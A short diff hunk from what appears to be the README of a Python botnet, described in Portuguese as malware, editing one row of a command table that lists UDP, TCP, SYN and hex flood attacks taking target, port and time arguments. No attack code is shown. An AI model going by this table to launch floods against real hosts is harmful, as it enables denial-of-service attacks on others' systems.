@@ -64,7 +64,7 @@ Depois execute o malware em outro dispositivo que suporte python (caso o alvo n√
   Command  | Usage | Description
   ---------|-------|-------------
   .UDP     | \<target> \<port> \<time> | Starts UDP Flood
-  .UDPB    | \<target> \<port> \<time> | Starts UDP Flood (Bypass)
+  .UDPB    | \<target> \<port> \<time> | Starts UDP Flood Bypass
   .TCP     | \<target> \<port> \<time> | Starts TCP Flood
   .SYN     | \<target> \<port> \<time> | Starts TCP SYN Flood
   .HEX     | \<target> \<port> \<time> | Starts HEXdecimal Flood
